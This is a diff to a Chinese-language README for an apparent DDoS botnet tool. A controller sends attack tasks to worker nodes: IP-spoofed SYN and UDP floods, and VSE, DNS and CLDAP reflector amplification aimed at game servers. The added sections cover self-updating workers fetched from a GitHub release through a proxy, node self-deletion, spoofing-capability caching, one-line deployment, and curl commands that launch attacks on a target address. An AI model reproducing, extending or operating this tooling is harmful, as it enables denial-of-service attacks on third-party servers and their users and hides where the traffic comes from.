@@ -27,17 +27,26 @@ flowchart LR
 ### 1. 编译
 
 ```bash
-# Linux（主推平台）
-GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o dist/controller-linux-amd64 ./cmd/controller/
-GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o dist/worker-linux-amd64    ./cmd/worker/
+# Linux（主推平台）— Controller 注入版本标签与仓库地址（云更新默认目标）
+GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build \
+  -ldflags="-s -w -X main.buildVersion=v1.1.2 -X main.gitRepo=2476818641/newtool" \
+  -o dist/controller-linux-amd64 ./cmd/controller/
+GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" \
+  -o dist/worker-linux-amd64 ./cmd/worker/
 
 # Windows（功能受限：不支持 IP 欺骗，纯 Go 无需 CGO）
-GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o dist/controller-windows-amd64.exe ./cmd/controller/
-GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o dist/worker-windows-amd64.exe    ./cmd/worker/
+GOOS=windows GOARCH=amd64 go build \
+  -ldflags="-s -w -X main.buildVersion=v1.1.2 -X main.gitRepo=2476818641/newtool" \
+  -o dist/controller-windows-amd64.exe ./cmd/controller/
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" \
+  -o dist/worker-windows-amd64.exe ./cmd/worker/
 ```
 
 `-ldflags="-s -w"` 去除调试符号，减小体积（controller ~17MB，worker ~12MB）。
-仓库 `dist/` 目录已附带四个平台的预编译产物，可直接使用。
+`-X main.buildVersion` 标记 Controller 自身版本（作为云更新的默认目标版本，保证 Worker 与
+Controller 版本一致）；`-X main.gitRepo` 启用默认 GitHub Release 下载地址。
+**推荐直接使用 GitHub Actions 发布**：打标签 `vX.Y.Z` 自动编译四个平台并用 UPX 压缩，
+产物发布到 Releases，可直接用于云更新。
 
 ### 2. 启动 Controller
 
@@ -90,6 +99,7 @@ sudo ./worker -c <controller-ip>:9090 -token <worker-token> -install
 - `-proxy` — 从 Controller 拉取 L7 代理（可选）
 - `-install` — 安装为 systemd/Windows 服务（可选）
 - `-daemon` — 免 nohup 后台运行（可选，适合非 root 小机器；日志 `data/worker.log`、PID `data/worker.pid`）
+- `-http-port` — Controller HTTP 端口（默认 8080；Controller 使用非默认 HTTP 端口时必须指定）
 
 **默认行为：**
 - 带宽：无限制，Controller 断开时自动降级节流
@@ -236,6 +246,37 @@ socks5://user:pass@socks.example.com:1080
 令牌生成一行下载即跑的命令。`-install` 与 `-daemon` 互斥。配置持久化在
 `data/deploy_storage_url.txt`。
 
+命令**全自动拼接**：Controller 公网 IP 自动探测并缓存（1 小时）、gRPC/HTTP 端口从监听
+地址推导、worker 令牌从 `data/auth/worker.token` 读取。支持 **curl / wget** 下载方式切换，
+一键**复制**按钮。`-install` 命令自动用 `sudo bash -c` 包装并在安装后立即启动服务。
+
+### 检查更新（云升级）
+仪表盘面板查询 GitHub 最新 Release（版本对比 + 更新说明 + 跳转链接 + 版本列表），
+**不会自动更新，由你选择**：
+- **整体升级** — 先设置 Worker 云更新目标（约 60s 自动更新），再升级 Controller 自身
+  （下载 → 校验 → 替换 → 重启）
+- **更新 Controller** — 仅升级 Controller
+- **更新 Workers** — 设置全部 Worker 自动更新
+- 版本下拉列出所有 Release（含日期），支持**回退到旧版本**
+
+可选配置 **GitHub Token**（速率限制从 60/小时 提升到 5000/小时，并解锁版本列表），
+持久化在 `data/github_token.txt`。
+
+### 云更新 Worker
+Worker 每 60s 轮询 `/api/deploy/version`。目标版本与当前不同时自动下载新二进制
+（配置了 ghproxy 前缀时经代理加速），校验（ELF/PE 魔数 + 大小），原子替换（`.bak`
+回滚），重启（Linux 用 `syscall.Exec` 保持 PID）。默认下载地址 = 当前构建标签的
+GitHub Release（按平台选二进制：worker-linux-amd64 / worker-windows-amd64.exe），
+自动拼接 `https://cf.liuass.eu.org/ghproxy/` 前缀供受限网络使用。
+
+### 节点管理
+- **踢出节点** — 停止攻击、写 `data/kicked` 标记、停用 systemd 服务/计划任务、
+  删除自身二进制并退出。被踢 ID 注册会被 Controller 拒绝；删除 `data/kicked` 可重新启用
+- **IP 伪造标记** — 每个节点显示伪造能力（支持 / 不支持 / 检测中）。探测结果按 IP
+  缓存到 `data/spoof_cache.json`：同 IP 重新上线直接复用，跳过重复探测
+- **目标节点选择** — 创建任务时可选参与节点（默认全部）。弹窗选择器支持按
+  ID / IP / 地区搜索；清空选择 = 全部节点
+
 ### 反射器池管理（`/pool`）
 独立的游戏反射器池管理页面。每个游戏标签页（ARK / CS2 / Rust / 其他）包含：
 - **Steam 条目**：通过 Steam Web API 每 6 小时自动刷新（需 `data/steam_api.key`）
@@ -264,6 +305,35 @@ curl -X POST http://localhost:8080/api/tasks \
   -H "Authorization: Bearer <admin-token>" \
   -H "Content-Type: application/json" \
   -d '{"target":"1.2.3.4:27015","method":"vse","duration":60,"threads":20}'
+
+# 指定参与节点攻击（workers 为空 = 全部在线节点）
+curl -X POST http://localhost:8080/api/tasks \
+  -H "Authorization: Bearer <admin-token>" \
+  -H "Content-Type: application/json" \
+  -d '{"target":"1.2.3.4:27015","method":"udp_stdhex","duration":60,"threads":20,
+       "workers":["1-2-3-4-node1","5-6-7-8-node1"]}'
+
+# 踢出节点（停止攻击、自删除、防自动重启）
+curl -X POST http://localhost:8080/api/nodes/1-2-3-4-node1/kick \
+  -H "Authorization: Bearer <admin-token>"
+
+# 撤销踢出（在 worker 退出前）
+curl -X DELETE http://localhost:8080/api/nodes/1-2-3-4-node1/kick \
+  -H "Authorization: Bearer <admin-token>"
+
+# 检查更新（版本对比 + 说明 + 链接）
+curl http://localhost:8080/api/update/check \
+  -H "Authorization: Bearer <admin-token>"
+
+# 配置 GitHub Token（5000次/小时 + 版本列表）
+curl -X PUT http://localhost:8080/api/update/token \
+  -H "Authorization: Bearer <admin-token>" \
+  -H "Content-Type: application/json" \
+  -d '{"token":"ghp_..."}'
+
+# 整体升级（先 Workers 后 Controller）到指定版本
+curl -X POST "http://localhost:8080/api/update/all?version=v1.1.2" \
+  -H "Authorization: Bearer <admin-token>"
 
 # 创建 TCP SYN 伪造源IP 攻击（仅 Linux）
 curl -X POST http://localhost:8080/api/tasks \
@@ -327,15 +397,21 @@ ds/
 │   │   └── ratelimiter_test.go # 速率限制器单元测试
 │   ├── controller/
 │   │   ├── controller.go     # gRPC + REST + WebSocket 服务
+│   │   ├── self_update.go    # 更新检测 + Controller 自更新 + GitHub Token
+│   │   ├── self_update_unix.go # syscall.Exec 重启（Linux）
+│   │   ├── self_update_windows.go # spawn 重启（Windows）
 │   │   ├── shodan.go         # Shodan API DNS 发现集成
-│   │   ├── spoof_probe.go    # UDP 欺骗探针监听
-│   │   └── tls.go            # 可选 TLS 证书加载
+│   │   ├── spoof_probe.go    # UDP 欺骗探针监听 + 按 IP 伪造缓存
+│   │   └── tls.go            # 可选 TLS 证书加载 + 协议嗅探
 │   ├── worker/
-│   │   ├── worker.go         # gRPC 客户端 + 任务执行 + 自启动
+│   │   ├── worker.go         # gRPC 客户端 + 任务执行 + 自启动 + 踢出
+│   │   ├── update.go         # 云自更新（下载/校验/替换/重启）
+│   │   ├── update_unix.go    # syscall.Exec 重启（Linux）
+│   │   ├── update_windows.go # spawn 重启（Windows）
 │   │   ├── bandwidth.go      # Linux 网卡带宽自动检测
 │   │   ├── local_pool.go     # Worker 本地 SQLite 反射器缓存
 │   │   ├── location.go       # 通过 api.ip.cc 检测地理位置
-│   │   ├── spoof_probe.go    # Worker 端 IP 欺骗能力探测
+│   │   ├── spoof_probe.go    # Worker 端 IP 欺骗能力探测 + 缓存查询
 │   │   ├── sysinfo_linux.go  # Linux CPU/内存 使用率采集
 │   │   └── sysinfo_windows.go# Windows CPU/内存 使用率采集
 │   ├── reflector/
@@ -349,6 +425,7 @@ ds/
 │   └── static/
 │       ├── index.html        # Alpine.js 仪表盘 SPA（中英双语）
 │       └── pool.html         # 反射器池管理页面（中英双语）
+├── .github/workflows/release.yml # 打标签自动编译 + UPX 压缩 + 发布 Release
 ├── data/                     # 运行时文件（自动创建）
 │   ├── auth/
 │   │   ├── admin.token
@@ -356,6 +433,10 @@ ds/
 │   ├── steam_api.key         # Steam Web API 密钥（可选）
 │   ├── shodan_config.json    # Shodan API 配置
 │   ├── reflectors.db         # SQLite 反射器池
+│   ├── deploy_update.json    # 云更新目标 {version,url}
+│   ├── deploy_storage_url.txt # 快速上线存储 URL
+│   ├── github_token.txt      # GitHub Token（可选，5000次/小时）
+│   ├── spoof_cache.json      # 按 IP 的伪造能力缓存
 │   ├── dns_amp_domain.txt    # 自定义 DNS 放大域名
 │   ├── dns_amp_domains.txt   # DNS 放大域名列表
 │   └── proxies.txt           # 全局代理列表
@@ -365,9 +446,6 @@ ds/
 │   ├── controller-linux-amd64
 │   ├── worker-linux-amd64
 │   └── data/                 # 绑定的运行时数据
-├── vse_amp_test.py           # VSE 反射器放大测试工具
-├── dns_amp_test.py           # DNS 放大倍数测试工具
-├── cldap_amp_test.py         # CLDAP 反射器测试工具
 ├── go.mod
 ├── go.sum
 ├── README.md
@@ -398,12 +476,14 @@ ds/
 | 接口 | 方法 | 认证 | 说明 |
 |----------|--------|------|-------------|
 | `/api/auth` | POST | 无 | 使用 Token 登录，返回角色 |
-| `/api/nodes` | GET | Bearer | 列出已连接的 Worker 节点（含 CPU/内存） |
+| `/api/nodes` | GET | Bearer | 列出已连接的 Worker 节点（含 CPU/内存/伪造标记） |
+| `/api/nodes/:id/kick` | POST | Bearer | 踢出节点（自退出+删除二进制，拒绝重新注册） |
+| `/api/nodes/:id/kick` | DELETE | Bearer | 撤销踢出（worker 退出前） |
 | `/api/tasks` | GET | Bearer | 列出所有任务 |
-| `/api/tasks` | POST | Bearer | 创建攻击任务（支持 `sub_attacks` 组合攻击） |
+| `/api/tasks` | POST | Bearer | 创建攻击任务（支持 `sub_attacks` 组合、`workers` 指定节点） |
 | `/api/tasks/:id/stop` | POST | Bearer | 停止运行中的任务 |
 | `/api/stats` | GET | Bearer | 聚合实时统计（PPS、BPS、包数） |
-| `/api/scan` | POST | Bearer | VSE/DNS 服务器扫描（单 IP 或 IP 段） |
+| `/api/scan` | POST | Bearer | VSE/DNS/CLDAP 服务器扫描（单 IP 或 IP 段） |
 | `/api/proxy` | GET | Bearer | 获取全局代理文件内容 |
 | `/api/proxy` | PUT | Bearer | 更新全局代理文件 |
 | `/api/pools` | GET | Bearer | 列出游戏池及计数 |
@@ -415,7 +495,18 @@ ds/
 | `/api/reflectors/version` | GET | Bearer | 池版本哈希+计数（Worker 缓存用） |
 | `/api/templates` | GET/POST/DELETE | Bearer | 攻击模板 CRUD |
 | `/api/deploy/config` | GET/PUT | Bearer | 快速上线云存储 URL 配置 |
-| `/api/deploy/command` | GET | Bearer | 生成部署命令（`addr`、`proxy=1`、`install=1`、`daemon=1`） |
+| `/api/deploy/command` | GET | Bearer | 生成部署命令（`tool=curl\|wget`、`proxy=1`、`install=1`、`daemon=1`） |
+| `/api/deploy/update` | PUT/GET | Admin | 设置 Worker 云更新目标 `{version,url}`（`clear:true` 清除） |
+| `/api/deploy/version` | GET | Bearer | Worker 轮询的更新目标（未设置 URL 时按平台返回 GitHub 地址） |
+| `/api/update/check` | GET | Bearer | 检查 GitHub 新版本（对比+说明+链接+版本列表） |
+| `/api/update/token` | GET/PUT | Admin | 管理 GitHub Token（5000次/小时，解锁版本列表） |
+| `/api/update/controller` | POST | Admin | 升级 Controller 自身（`?version=` 指定标签） |
+| `/api/update/workers` | POST | Admin | 设置 Worker 自动更新（`?version=` 指定标签） |
+| `/api/update/all` | POST | Admin | 整体升级：先 Workers 后 Controller |
+| `/api/worker/spoof-probe` | POST | Bearer | 伪造探测注册（Worker） |
+| `/api/worker/spoof-probe/result` | GET | Bearer | 伪造探测结果轮询（Worker） |
+| `/api/worker/spoof-status` | POST | Bearer | Worker 上报伪造结果（按 IP 缓存） |
+| `/api/worker/spoof-cache` | GET | Bearer | 查询按 IP 的伪造缓存（重上线跳过探测） |
 | `/api/logs` | GET | Bearer | 攻击日志历史 |
 | `/api/logs/export` | GET | Bearer | CSV 导出 |
 | `/ws` | WS | query | 仪表盘实时数据推送 |
